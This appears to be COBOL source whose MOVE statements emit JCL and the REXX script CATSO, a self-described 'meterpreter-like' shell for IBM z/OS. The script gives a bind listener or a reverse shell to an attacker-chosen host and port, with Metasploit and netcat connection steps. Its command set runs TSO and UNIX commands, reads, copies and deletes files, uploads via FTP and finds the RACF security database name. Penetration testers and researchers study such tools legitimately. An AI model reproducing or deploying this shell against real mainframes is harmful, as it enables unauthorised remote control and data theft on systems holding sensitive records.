     MOVE '//CATSOJO  JOB ''CATSO''' TO WS-LINE(1)
     MOVE '//DEL0010  EXEC PGM=IEFBR14' TO WS-LINE(2)
     MOVE '//DSN2DEL  DD   DSN=DOGE.CATSO,DISP=(MOD,DELETE),'
-     TO WS-LINE(3)
     MOVE '//         SPACE=(CYL,0)' TO WS-LINE(4)
     MOVE '//         EXEC PGM=IEBGENER' TO WS-LINE(5)
     MOVE '//SYSIN    DD DUMMY' TO WS-LINE(6)
     MOVE '//SYSPRINT DD SYSOUT=X' TO WS-LINE(7)
     MOVE '//SYSUT1   DD *,DLM=XX' TO WS-LINE(8)
     MOVE '/*                           REXX                      
-    '              */' TO WS-LINE(9)
     MOVE '/*  Catso. n. 1. A base fellow; a rogue; a cheat,      
-    '              */' TO WS-LINE(10)
     MOVE '/*               also a z/OS Network TSO ''shell''     
-    '                */' TO WS-LINE(11)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(12)
     MOVE '/*  CaTSO is a A "meterpreter" like shell written in RE
-    'XX.           */' TO WS-LINE(13)
     MOVE '/*  Yet another amazing mainframe tool brought to you b
-    'y:            */' TO WS-LINE(14)
     MOVE '/*             .                  .         .          
-    '              */' TO WS-LINE(15)
     MOVE '/*             .___________       ._________.          
-    '              */' TO WS-LINE(16)
     MOVE '/*             :    .     /       :         :          
-    '              */' TO WS-LINE(17)
     MOVE '/*             |    |____/________|    _____|          
-    '              */' TO WS-LINE(18)
     MOVE '/*             |____.    |        |         |          
-    '              */' TO WS-LINE(19)
     MOVE '/*             |    |    |    :   |   ______:          
-    '              */' TO WS-LINE(20)
     MOVE '/*             |    |    |    |   |   |     .          
-    '              */' TO WS-LINE(21)
     MOVE '/*             :_________|________|___|                
-    '              */' TO WS-LINE(22)
     MOVE '/*             . Soldier     of     Fortran            
-    '              */' TO WS-LINE(23)
     MOVE '/*                   (@mainframed767)                  
-    '              */' TO WS-LINE(24)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(25)
     MOVE '/*  This is a REXX script meant to run in TSO on IBM z/
-    'OS            */' TO WS-LINE(26)
     MOVE '/*  It creates a Listener or Reverse ''shell'' on a sup
-    'plied port      */' TO WS-LINE(27)
     MOVE '/*  Connect to it with either metasploit or netcat     
-    '              */' TO WS-LINE(28)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(29)
     MOVE '/*  Either upload the script and execute: tso ex ''user
-    'id.zossock''    */' TO WS-LINE(30)
     MOVE '/*  or use a JCL file and execute it that way          
-    '              */' TO WS-LINE(31)
     MOVE '/*  On the PC side you can use Netcat or Metasploit to 
-    'connect.      */' TO WS-LINE(32)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(33)
     MOVE '/*  In Listener Mode                                   
-    '              */' TO WS-LINE(34)
     MOVE '/*  ================                                   
-    '              */' TO WS-LINE(35)
     MOVE '/*  On the Mainframe:                                  
-    '              */' TO WS-LINE(36)
     MOVE '/*  <scriptname> L Port                                
-    '              */' TO WS-LINE(37)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(38)
     MOVE '/*  With Metasploit:                                   
-    '              */' TO WS-LINE(39)
     MOVE '/*  msf > use multi/handler                            
-    '              */' TO WS-LINE(40)
     MOVE '/*  msf exploit(handler) > set payload generic/shell_bi
-    'nd_tcp        */' TO WS-LINE(41)
     MOVE '/*  payload => generic/shell_bind_tcp                  
-    '              */' TO WS-LINE(42)
     MOVE '/*  msf exploit(handler) > set RHOST IP  (Mainframe IP 
-    'Address)      */' TO WS-LINE(43)
     MOVE '/*  msf exploit(handler) > set LPORT Port (the port you
-    ' picked)      */' TO WS-LINE(44)
     MOVE '/*  msf exploit(handler) > exploit                     
-    '              */' TO WS-LINE(45)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(46)
     MOVE '/*  With Netcat:                                       
-    '              */' TO WS-LINE(47)
     MOVE '/*  $ nc IP Port                                       
-    '              */' TO WS-LINE(48)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(49)
     MOVE '/*  In Reverse Mode                                    
-    '              */' TO WS-LINE(50)
     MOVE '/*  ================                                   
-    '              */' TO WS-LINE(51)
     MOVE '/*  With Metasploit:                                   
-    '              */' TO WS-LINE(52)
     MOVE '/*  msf > use multi/handler                            
-    '              */' TO WS-LINE(53)
     MOVE '/*  msf exploit(handler) > set payload generic/shell_re
-    'verse_tcp     */' TO WS-LINE(54)
     MOVE '/*  payload => generic/shell_reverse_tcp               
-    '              */' TO WS-LINE(55)
     MOVE '/*  msf exploit(handler) > set lhost your-ip-address   
-    '              */' TO WS-LINE(56)
     MOVE '/*  msf exploit(handler) > set LPORT your-port         
-    '              */' TO WS-LINE(57)
     MOVE '/*  msf exploit(handler) > exploit                     
-    '              */' TO WS-LINE(58)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(59)
     MOVE '/*  With Netcat:                                       
-    '              */' TO WS-LINE(60)
     MOVE '/*  $ nc -lp your_port                                 
-    '              */' TO WS-LINE(61)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(62)
     MOVE '/*  On the Mainframe:                                  
-    '              */' TO WS-LINE(63)
     MOVE '/*  <scriptname> R your-ip-addredd your-port           
-    '              */' TO WS-LINE(64)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(65)
     MOVE '/*  ASCII Art modified from:                           
-    '              */' TO WS-LINE(66)
     MOVE '/*   http://sixteencolors.net/pack/rmrs-03/DW-CHOOS.ANS
-    '              */' TO WS-LINE(67)
     MOVE '/*                                                     
-    '              */' TO WS-LINE(68)
     MOVE '/*                   Let''s start the show!            
-    '               */' TO WS-LINE(69)
     MOVE '/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    '~~~~~~~~~~~~~ */' TO WS-LINE(70)
     MOVE ' ' TO WS-LINE(71)
     MOVE '/* Uncomment this line to turn on debugging */'
-     TO WS-LINE(72)
     MOVE '/* TRACE I */' TO WS-LINE(73)
     MOVE '/* change verbose to 1 to see results on the screen */'
-     TO WS-LINE(74)
     MOVE 'verbose = 0' TO WS-LINE(75)
     MOVE ' ' TO WS-LINE(76)
     MOVE 'if verbose then say ''''' TO WS-LINE(77)
     MOVE 'if verbose then say ''''' TO WS-LINE(78)
     MOVE 'if verbose then say ''''' TO WS-LINE(79)
     MOVE 'pwd = userid()' TO WS-LINE(80)
     MOVE 'NEWLINE = "25"x /* this is the hex equivalent of EBCDIC
-    ' /n */' TO WS-LINE(81)
     MOVE ' ' TO WS-LINE(82)
     MOVE 'PARSE ARG type arghost argport' TO WS-LINE(83)
     MOVE ' ' TO WS-LINE(84)
     MOVE '/* Parse the arguments to see what we want to do */'
-     TO WS-LINE(85)
     MOVE 'SELECT' TO WS-LINE(86)
     MOVE 'WHEN type = ''L'' THEN' TO WS-LINE(87)
     MOVE 'DO' TO WS-LINE(88)
     MOVE '   IF arghost = '''' THEN' TO WS-LINE(89)
     MOVE '   DO' TO WS-LINE(90)
     MOVE '     if verbose then say "[+] You specified Listener wi
-    'thout a port."' TO WS-LINE(91)
     MOVE '     if verbose then say "Using default: 12345"'
-     TO WS-LINE(92)
     MOVE '     arghost = 12345' TO WS-LINE(93)
     MOVE '   END' TO WS-LINE(94)
     MOVE 'if verbose then say ''[+] Listening on port:'' arghost'
-     TO WS-LINE(95)
     MOVE 'party = MATT_DAEMON(arghost)' TO WS-LINE(96)
     MOVE 'END' TO WS-LINE(97)
     MOVE 'WHEN type = ''R'' THEN' TO WS-LINE(98)
     MOVE 'DO' TO WS-LINE(99)
     MOVE '  IF arghost = '''' | argport = '''' THEN'
-     TO WS-LINE(100)
     MOVE '  DO' TO WS-LINE(101)
     MOVE '   SAY ''[!] You must pass a host and port when using R
-    'everse''' TO WS-LINE(102)
     MOVE '   EXIT 4' TO WS-LINE(103)
     MOVE '  END' TO WS-LINE(104)
     MOVE '  if verbose then say ''[+] Sending shell to'' arghost|
-    '|":"||argport' TO WS-LINE(105)
     MOVE ' ttime = RIVER_SONG(arghost,argport) /* Reverse Connect
-    'ion */' TO WS-LINE(106)
     MOVE 'END' TO WS-LINE(107)
     MOVE 'OTHERWISE  /* Excellent */' TO WS-LINE(108)
     MOVE '        PARSE SOURCE . . . . name .' TO WS-LINE(109)
     MOVE '        say "No arguments passed! Run this as either se
-    'rver or client:"' TO WS-LINE(110)
     MOVE '        say "Reverse Shell: ''"||name||"'' ''R IP PORT'
-    ''"' TO WS-LINE(111)
     MOVE '        say "Listener Shell: ''"||name||"'' ''L PORT''"
-    '' TO WS-LINE(112)
     MOVE '    EXIT 4' TO WS-LINE(113)
     MOVE 'END /* End the arguments parser */' TO WS-LINE(114)
     MOVE ' ' TO WS-LINE(115)
     MOVE 'MATT_DAEMON: /* Starts the listener mode */'
-     TO WS-LINE(116)
     MOVE '    parse arg port' TO WS-LINE(117)
     MOVE '    terp = SOCKET(''INITIALIZE'',''DAEMON'',2)'
-     TO WS-LINE(118)
     MOVE '    /* terp is short for z-terpreter */'
-     TO WS-LINE(119)
     MOVE '    parse var terp terp_rc .' TO WS-LINE(120)
     MOVE '    IF terp_rc <> 0 THEN' TO WS-LINE(121)
     MOVE '    DO' TO WS-LINE(122)
     MOVE '      if verbose then say "[!] Couldn''t create socket"
-    '' TO WS-LINE(123)
     MOVE '      exit 1' TO WS-LINE(124)
     MOVE '    END' TO WS-LINE(125)
     MOVE '    terp = Socket(''GetHostId'')' TO WS-LINE(126)
     MOVE '    parse var terp socket_rc MF_IP .' TO WS-LINE(127)
     MOVE '    terp = Socket(''Gethostname'')' TO WS-LINE(128)
     MOVE '    parse var terp src hostname' TO WS-LINE(129)
     MOVE '    /* setup the socket */' TO WS-LINE(130)
     MOVE '    terp = SOCKET(''SOCKET'')' TO WS-LINE(131)
     MOVE '    parse var terp socket_rc socketID .'
-     TO WS-LINE(132)
     MOVE '    if socket_rc <> 0 then' TO WS-LINE(133)
     MOVE '    DO' TO WS-LINE(134)
     MOVE '      if verbose then say "[!] Socket FAILED with info:
-    '" terp' TO WS-LINE(135)
     MOVE '      terp = SOCKET(''TERMINATE'')' TO WS-LINE(136)
     MOVE '      exit 1' TO WS-LINE(137)
     MOVE '    END' TO WS-LINE(138)
     MOVE ' ' TO WS-LINE(139)
     MOVE '    /* Setup: ASCII conversion, Reuse, no linger and no
-    'n-blocking */' TO WS-LINE(140)
     MOVE '  terp = Socket(''SETSOCKOPT'',socketID,''SOL_SOCKET'',
-    '''SO_REUSEADDR'',''ON'')' TO WS-LINE(141)
     MOVE '    terp = Socket(''SETSOCKOPT'',socketID,''SOL_SOCKET'
-    '',''SO_LINGER'',''OFF'')' TO WS-LINE(142)
     MOVE '  terp = Socket(''SETSOCKOPT'',socketID,''SOL_SOCKET'',
-    '''SO_KEEPALIVE'',''ON'')' TO WS-LINE(143)
     MOVE '    terp = Socket(''IOCTL'',socketID,''FIONBIO'',''ON''
-    ')' TO WS-LINE(144)
     MOVE '    terp = Socket(''BIND'',socketID,''AF_INET'' port MF
-    '_IP)' TO WS-LINE(145)
     MOVE '    parse var terp connect_rc rest' TO WS-LINE(146)
     MOVE '    if connect_rc <> 0 then' TO WS-LINE(147)
     MOVE '    DO' TO WS-LINE(148)
     MOVE '      if verbose then say "[!] Bind Failed:" terp'
-     TO WS-LINE(149)
     MOVE '      CALL DAVID_COULIER(1)' TO WS-LINE(150)
     MOVE '    END' TO WS-LINE(151)
     MOVE '    if verbose then say "[!] IP" MF_IP "and Port" port 
-    '"opened"' TO WS-LINE(152)
     MOVE '    terp = Socket(''Listen'',socketID,2)'
-     TO WS-LINE(153)
     MOVE '    parse var terp src .' TO WS-LINE(154)
     MOVE '    if src > 0 then DAVID_COULIER(1)' TO WS-LINE(155)
     MOVE '    if verbose then say ''[+] Server Ready'''
-     TO WS-LINE(156)
     MOVE ' ' TO WS-LINE(157)
     MOVE '    clients = ''''' TO WS-LINE(158)
     MOVE '   DO FOREVER /* Like, forever forever? A: Yes. */'
-     TO WS-LINE(159)
     MOVE '    terp = Socket(''Select'',''READ'' socketID clients 
-    '''WRITE'' ''EXCEPTION'')' TO WS-LINE(160)
     MOVE 'parse upper var terp ''READ'' readin ''WRITE'' writtin 
-    '''EXCEPTION'' exceptin' TO WS-LINE(161)
     MOVE ' ' TO WS-LINE(162)
     MOVE '    IF INLIST(socketID,readin) THEN /* see if we have a
-    ' new socket */' TO WS-LINE(163)
     MOVE '    DO' TO WS-LINE(164)
     MOVE '     terp = Socket(''Accept'',socketID)'
-     TO WS-LINE(165)
     MOVE '     parse var terp src hackerID . hport hip'
-     TO WS-LINE(166)
     MOVE '     if verbose then say "[!] Connection from "||hip||"
-    ':"||hport' TO WS-LINE(167)
     MOVE '     clients = hackerID' TO WS-LINE(168)
     MOVE '     if verbose then say ''[+] Hacker socket ID'' clien
-    'ts' TO WS-LINE(169)
     MOVE '     terp = Socket(''Socketsetstatus'')'
-     TO WS-LINE(170)
     MOVE '     parse var terp src . status' TO WS-LINE(171)
     MOVE '     if verbose then say ''[+] Current Status'' status'
-     TO WS-LINE(172)
     MOVE '     terp = Socket(''Setsockopt'',hackerID,''SOL_SOCKET
-    ''',''SO_ASCII'',''ON'')' TO WS-LINE(173)
     MOVE '     terp = Socket(''Ioctl'',hackerID,''FIONBIO'',''ON'
-    '' )' TO WS-LINE(174)
     MOVE '     terp = SOCKET(''SEND'',hackerID, "Enter command or
-    ' ''help''> ")' TO WS-LINE(175)
     MOVE '    END /* end new connection check */' TO WS-LINE(176)
     MOVE '/* If the READ is our hacker socket ID then do all the 
-    'goodness */' TO WS-LINE(177)
     MOVE '/* since there''s only one socket allowed, it will only
-    ' be that id */' TO WS-LINE(178)
     MOVE '    if readin = hackerID THEN' TO WS-LINE(179)
     MOVE '    DO' TO WS-LINE(180)
     MOVE '     ARNOLD = commando(hackerID) /* get the command */'
-     TO WS-LINE(181)
     MOVE '     if verbose then say "[+] Commands received: "||ARN
-    'OLD' TO WS-LINE(182)
     MOVE '     parse = CHOPPA(hackerID,ARNOLD) /* Get the cmd to 
-    'da choppa! */' TO WS-LINE(183)
     MOVE '    END' TO WS-LINE(184)
     MOVE '   END /* OK not forever */' TO WS-LINE(185)
     MOVE ' ' TO WS-LINE(186)
     MOVE 'return 0' TO WS-LINE(187)
     MOVE ' ' TO WS-LINE(188)
     MOVE 'RIVER_SONG: /* Get it? Reverse Con, connection? Yea you
-    ' got it! */' TO WS-LINE(189)
     MOVE 'PARSE ARG rhost,  rport' TO WS-LINE(190)
     MOVE '    terp = SOCKET(''INITIALIZE'',''CLIENT'',2)'
-     TO WS-LINE(191)
     MOVE '    /* terp is short for z-terpreter */'
-     TO WS-LINE(192)
     MOVE '    terp = SOCKET(''SOCKET'',2,''STREAM'',''TCP'')'
-     TO WS-LINE(193)
     MOVE '    parse var terp socket_rc socketID .'
-     TO WS-LINE(194)
     MOVE '    if socket_rc <> 0 then' TO WS-LINE(195)
     MOVE '    do' TO WS-LINE(196)
     MOVE '       if verbose then say "[!] Socket FAILED with info
-    ':" terp' TO WS-LINE(197)
     MOVE '       terp = SOCKET(''TERMINATE'')' TO WS-LINE(198)
     MOVE '       exit 1' TO WS-LINE(199)
     MOVE '    end' TO WS-LINE(200)
     MOVE '  terp = Socket(''SETSOCKOPT'',socketID,''SOL_SOCKET'',
-    '''SO_KEEPALIVE'',''ON'')' TO WS-LINE(201)
     MOVE '    /* Okay now we setup so it can do EBCDIC to ASCII c
-    'onversion */' TO WS-LINE(202)
     MOVE '    terp = SOCKET(''SETSOCKOPT'',socketID,''SOL_SOCKET'
-    '',''SO_ASCII'',''On'')' TO WS-LINE(203)
     MOVE '    parse var terp ascii_rc .' TO WS-LINE(204)
     MOVE '    if ascii_rc <> 0 then' TO WS-LINE(205)
     MOVE '    do' TO WS-LINE(206)
     MOVE '      if verbose then say "[!] Setting ASCII mode faile
-    'd:" terp' TO WS-LINE(207)
     MOVE '      exit 1' TO WS-LINE(208)
     MOVE '    end' TO WS-LINE(209)
     MOVE '    terp = SOCKET(''SOCKETSETSTATUS'',''CLIENT'')'
-     TO WS-LINE(210)
     MOVE '    if verbose then say "[+] Socket Status is" terp'
-     TO WS-LINE(211)
     MOVE '    terp = SOCKET(''CONNECT'',socketID,''AF_INET'' rpor
-    't rhost)' TO WS-LINE(212)
     MOVE '    parse var terp connect_rc rest' TO WS-LINE(213)
     MOVE '    if connect_rc <> 0 then' TO WS-LINE(214)
     MOVE '    do' TO WS-LINE(215)
     MOVE '      if verbose then say "[!] Connection Failed:" terp
-    '' TO WS-LINE(216)
     MOVE '      CALL DAVID_COULIER(4)' TO WS-LINE(217)
     MOVE '    end' TO WS-LINE(218)
     MOVE '    if verbose then say "[!] Connection Established to"
-    ',' TO WS-LINE(219)
     MOVE '                        rhost||":"||rport'
-     TO WS-LINE(220)
     MOVE '    terp = SOCKET(''SEND'',socketID, "Enter command or 
-    '''help''> ")' TO WS-LINE(221)
     MOVE ' ' TO WS-LINE(222)
     MOVE '    DO FOREVER /* The never end storyyyyy */'
-     TO WS-LINE(223)
     MOVE '      ARNOLD = commando(socketID) /* get the command */
-    '' TO WS-LINE(224)
     MOVE '      if verbose then say "[+] Commands received: "||AR
-    'NOLD' TO WS-LINE(225)
     MOVE '      parse = CHOPPA(socketID,ARNOLD) /* get the cmd to
-    ' da choppa! */' TO WS-LINE(226)
     MOVE '    END /* Atreyu! */' TO WS-LINE(227)
     MOVE 'return 0' TO WS-LINE(228)
     MOVE ' ' TO WS-LINE(229)
     MOVE 'DAVID_COULIER: /* CUT. IT. OUT. */' TO WS-LINE(230)
     MOVE '    parse arg exito .' TO WS-LINE(231)
     MOVE '    terp = SOCKET(''CLOSE'',socketID)' TO WS-LINE(232)
     MOVE '    EXIT exito' TO WS-LINE(233)
     MOVE 'return 0' TO WS-LINE(234)
     MOVE ' ' TO WS-LINE(235)
     MOVE 'CHOPPA:' TO WS-LINE(236)
     MOVE 'parse arg sockID, do_it' TO WS-LINE(237)
     MOVE 'parse var do_it do_it do_commands' TO WS-LINE(238)
     MOVE '/* We have our socket and commands not lets do this */'
-     TO WS-LINE(239)
     MOVE '    SELECT' TO WS-LINE(240)
     MOVE '        WHEN do_it = ''sysinfo'' THEN' TO WS-LINE(241)
     MOVE '        DO' TO WS-LINE(242)
     MOVE '          send_it = GET_OS_INFO()' TO WS-LINE(243)
     MOVE '          if verbose then say ''[!] Sending OS Info'''
-     TO WS-LINE(244)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(245)
     MOVE '        END' TO WS-LINE(246)
     MOVE '        WHEN do_it = ''cat'' THEN' TO WS-LINE(247)
     MOVE '        DO' TO WS-LINE(248)
     MOVE '          send_it = CAT_FILE(do_commands)'
-     TO WS-LINE(249)
     MOVE '          if verbose then say ''[!] Catting file'' do_c
-    'ommands' TO WS-LINE(250)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(251)
     MOVE '        END' TO WS-LINE(252)
     MOVE '        WHEN do_it = ''cd'' THEN' TO WS-LINE(253)
     MOVE '        DO' TO WS-LINE(254)
     MOVE '            if verbose then say ''[!] CD to'' do_comman
-    'ds' TO WS-LINE(255)
     MOVE '            send_it = NEWLINE||"cd to "||do_commands||N
-    'EWLINE' TO WS-LINE(256)
     MOVE '            pwd = do_commands' TO WS-LINE(257)
     MOVE '            terp = SOCKET(''SEND'',sockID, send_it||NEW
-    'LINE)' TO WS-LINE(258)
     MOVE '        END' TO WS-LINE(259)
     MOVE '        WHEN do_it = ''pwd'' THEN' TO WS-LINE(260)
     MOVE '        DO' TO WS-LINE(261)
     MOVE '          send_it = NEWLINE||UPPER(pwd)||NEWLINE'
-     TO WS-LINE(262)
     MOVE '          if verbose then say ''[!] Sending PWD of:'' p
-    'wd' TO WS-LINE(263)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(264)
     MOVE '        END' TO WS-LINE(265)
     MOVE '        WHEN do_it = ''ls'' THEN' TO WS-LINE(266)
     MOVE '        DO' TO WS-LINE(267)
     MOVE '          IF do_commands = '''' THEN' TO WS-LINE(268)
     MOVE '            send_it = LS(sockID,pwd)' TO WS-LINE(269)
     MOVE '          ELSE' TO WS-LINE(270)
     MOVE '            send_it = LS(sockID,do_commands)'
-     TO WS-LINE(271)
     MOVE '          if verbose then say ''[!] Sending LS COMMAND'
-    ''' TO WS-LINE(272)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(273)
     MOVE '        END' TO WS-LINE(274)
     MOVE '        WHEN do_it = ''cp'' THEN' TO WS-LINE(275)
     MOVE '        DO' TO WS-LINE(276)
     MOVE '          send_it = CP(do_commands)' TO WS-LINE(277)
     MOVE '          if verbose then say ''[!] Copying'' do_comman
-    'ds' TO WS-LINE(278)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(279)
     MOVE '        END' TO WS-LINE(280)
     MOVE '        WHEN do_it = ''del'' | do_it = ''delete'' THEN'
-     TO WS-LINE(281)
     MOVE '        DO' TO WS-LINE(282)
     MOVE '          send_it = DELETE(do_commands)'
-     TO WS-LINE(283)
     MOVE '          if verbose then say ''[!] Deleting'' do_comma
-    'nds' TO WS-LINE(284)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(285)
     MOVE '        END' TO WS-LINE(286)
     MOVE ' ' TO WS-LINE(287)
     MOVE '        WHEN do_it = ''unix'' THEN' TO WS-LINE(288)
     MOVE '        DO' TO WS-LINE(289)
     MOVE '          send_it = UNIX_COMMAND(do_commands)'
-     TO WS-LINE(290)
     MOVE '          if verbose then say ''[!] Sending UNIX COMMAN
-    'D''' TO WS-LINE(291)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(292)
     MOVE '        END' TO WS-LINE(293)
     MOVE '        WHEN do_it = ''tso'' | do_it = ''execute'' THEN
-    '' TO WS-LINE(294)
     MOVE '        DO' TO WS-LINE(295)
     MOVE '          send_it = TSO_COMMAND(do_commands)'
-     TO WS-LINE(296)
     MOVE '          if verbose then say ''[!] Executing TSO Comma
-    'nd'' do_commands' TO WS-LINE(297)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(298)
     MOVE '        END' TO WS-LINE(299)
     MOVE '        WHEN do_it = ''ftp'' THEN' TO WS-LINE(300)
     MOVE '        DO' TO WS-LINE(301)
     MOVE '          send_it = UPLOAD_FILE(do_commands)'
-     TO WS-LINE(302)
     MOVE '          if verbose then say ''[!] Using FTP to upload
-    ' to'' do_commands' TO WS-LINE(303)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(304)
     MOVE '        END' TO WS-LINE(305)
     MOVE '        WHEN do_it = ''getuid'' THEN' TO WS-LINE(306)
     MOVE '        DO' TO WS-LINE(307)
     MOVE '          send_it = GET_UID()' TO WS-LINE(308)
     MOVE '          if verbose then say ''[!] Sending UID'''
-     TO WS-LINE(309)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(310)
     MOVE '        END' TO WS-LINE(311)
     MOVE '        WHEN do_it = ''lsmem'' THEN' TO WS-LINE(312)
     MOVE '        DO' TO WS-LINE(313)
     MOVE '          IF do_commands = '''' THEN' TO WS-LINE(314)
     MOVE '            send_it = LS_MEMBERS(pwd)' TO WS-LINE(315)
     MOVE '          ELSE' TO WS-LINE(316)
     MOVE '            send_it = LS_MEMBERS(do_commands)'
-     TO WS-LINE(317)
     MOVE '          if verbose then say ''[!] Sending Members'''
-     TO WS-LINE(318)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(319)
     MOVE '        END' TO WS-LINE(320)
     MOVE '        WHEN do_it = ''ipconfig'' | do_it = ''ifconfig'
-    '' THEN' TO WS-LINE(321)
     MOVE '        DO' TO WS-LINE(322)
     MOVE '          send_it = GET_IP_INFO()' TO WS-LINE(323)
     MOVE '          if verbose then say ''[!] Sending IP Info'''
-     TO WS-LINE(324)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(325)
     MOVE '        END' TO WS-LINE(326)
     MOVE '        WHEN do_it = ''racf'' THEN' TO WS-LINE(327)
     MOVE '        DO' TO WS-LINE(328)
     MOVE '          send_it = GET_RACFDB()' TO WS-LINE(329)
     MOVE '          if verbose then say ''[!] Sending RACF Databa
-    'se Dataset Name''' TO WS-LINE(330)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(331)
     MOVE '        END' TO WS-LINE(332)
     MOVE '        WHEN do_it = ''help'' THEN' TO WS-LINE(333)
     MOVE '        DO' TO WS-LINE(334)
     MOVE '          send_it = GET_HELP()' TO WS-LINE(335)
     MOVE '          if verbose then say ''[!] Sending Help'''
-     TO WS-LINE(336)
     MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
-    'NE)' TO WS-LINE(337)
     MOVE '        END' TO WS-LINE(338)
     MOVE '        WHEN do_it = ''quit'' | do_it = ''exit'' THEN'
-     TO WS-LINE(339)
     MOVE '        DO' TO WS-LINE(340)
     MOVE '          if verbose then say ''[!] POP POP!'''
-     TO WS-LINE(341)
     MOVE '          CALL DAVID_COULIER(0) /* jackalope */'
-     TO WS-LINE(342)
     MOVE '     END' TO WS-LINE(343)
     MOVE '     OTHERWISE /* The end of our options */'
-     TO WS-LINE(344)
     MOVE '         if verbose then say ''[!] Unrecognized Command
-    '''' TO WS-LINE(345)
     MOVE '    END /* End the select section */' TO WS-LINE(346)
     MOVE '    terp = SOCKET(''SEND'',sockID, "Enter command or ''
-    'help''> ")' TO WS-LINE(347)
     MOVE '  return 0' TO WS-LINE(348)
     MOVE ' ' TO WS-LINE(349)
     MOVE 'INLIST: procedure' TO WS-LINE(350)
     MOVE 'arg sock, socklist' TO WS-LINE(351)
     MOVE ' ' TO WS-LINE(352)
     MOVE 'DO i = 1 to words(socklist)' TO WS-LINE(353)
     MOVE '  if words(socklist) = 0' TO WS-LINE(354)
     MOVE '    then return 0' TO WS-LINE(355)
     MOVE '  if sock = word(socklist,i)' TO WS-LINE(356)
     MOVE '    then return 1' TO WS-LINE(357)
     MOVE 'end' TO WS-LINE(358)
     MOVE ' ' TO WS-LINE(359)
     MOVE 'return 0' TO WS-LINE(360)
     MOVE ' ' TO WS-LINE(361)
     MOVE 'commando:  /* GET IN DA CHOPPA */' TO WS-LINE(362)
     MOVE 'parse arg socket_to_use' TO WS-LINE(363)
     MOVE '/* get commands */' TO WS-LINE(364)
     MOVE '     choppa = ''''' TO WS-LINE(365)
     MOVE '     sox = SOCKET(''RECV'',socket_to_use,10000)'
-     TO WS-LINE(366)
     MOVE '     parse var sox s_rc s_type s_port s_ip s_results'
-     TO WS-LINE(367)
     MOVE '     parse var sox s_rc s_data_len s_data_text'
-     TO WS-LINE(368)
     MOVE '     if s_rc <> 0 then' TO WS-LINE(369)
     MOVE '     do' TO WS-LINE(370)
     MOVE '        if verbose then say "[!] Couldn''t get data"'
-     TO WS-LINE(371)
     MOVE '        CALL DAVID_COULIER(1)' TO WS-LINE(372)
     MOVE '     end' TO WS-LINE(373)
     MOVE '     /* Strip off the last byte cause it''s all weird *
-    '/' TO WS-LINE(374)
     MOVE '     chopper = DELSTR(s_data_text, LENGTH(s_data_text))
-    '' TO WS-LINE(375)
     MOVE '  return chopper' TO WS-LINE(376)
     MOVE ' ' TO WS-LINE(377)
     MOVE ' ' TO WS-LINE(378)
     MOVE 'GET_UID: /* returns the UID */' TO WS-LINE(379)
     MOVE '   text = NEWLINE||"Mainframe userID: "||userid()||NEWL
-    'INE' TO WS-LINE(380)
     MOVE '   return text' TO WS-LINE(381)
     MOVE ' ' TO WS-LINE(382)
     MOVE 'GET_IP_INFO:' TO WS-LINE(383)
     MOVE '/* Uses TSO command ''netstat home'' to get IP config *
-    '/' TO WS-LINE(384)
     MOVE '/* Requires TSO segment */' TO WS-LINE(385)
     MOVE '   x = OUTTRAP(''var.'')' TO WS-LINE(386)
     MOVE '   address tso  "NETSTAT HOME"' TO WS-LINE(387)
     MOVE '   parse var var.1 a1 a2 a3 a4 a5 a6 a7 a8 type .'
-     TO WS-LINE(388)
     MOVE '   text = NEWLINE||"TCP/IP Name:" type||NEWLINE'
-     TO WS-LINE(389)
     MOVE '   IPADDR = SOCKET(''GETHOSTID'')' TO WS-LINE(390)
     MOVE '   parse var IPADDR ip_rc ip_addr' TO WS-LINE(391)
     MOVE '  text = text||"Connected using IP Address: "||ip_addr|
-    '|NEWLINE||NEWLINE' TO WS-LINE(392)
     MOVE '   j = 1' TO WS-LINE(393)
     MOVE '   DO i = 5 TO var.0' TO WS-LINE(394)
     MOVE '       parse var var.i garbage ip_addr link flag_sp'
-     TO WS-LINE(395)
     MOVE '       flag = SPACE(flag_sp,0)' TO WS-LINE(396)
     MOVE '       text = text||"Interface "||j||NEWLINE||"========
-    '=="||NEWLINE,' TO WS-LINE(397)
     MOVE '       "Name         : "||link||NEWLINE,'
-     TO WS-LINE(398)
     MOVE '       "IPv4 Address : "||ip_addr||NEWLINE,'
-     TO WS-LINE(399)
     MOVE '       "Flag         : "||flag||NEWLINE||NEWLINE'
-     TO WS-LINE(400)
     MOVE '       j = j + 1' TO WS-LINE(401)
     MOVE '   end' TO WS-LINE(402)
     MOVE '   x = OUTTRAP(OFF)' TO WS-LINE(403)
     MOVE ' return text' TO WS-LINE(404)
     MOVE ' ' TO WS-LINE(405)
